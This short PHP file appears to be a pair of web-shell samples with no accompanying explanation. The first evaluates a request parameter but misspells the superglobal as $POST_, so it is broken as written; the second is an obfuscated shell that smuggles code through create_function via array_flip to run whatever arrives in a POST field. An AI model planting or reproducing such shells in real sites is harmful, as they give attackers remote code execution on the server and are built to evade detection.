<?php
@eval($POST_['xss']);
?>

<?php
$args = 1;
$arr=array("n;}$_POST[1];/*"=>"test");
$arr1=array_flip($arr);
$arr2 = $arr1[test];
create_function('$args',$arr2); 
?>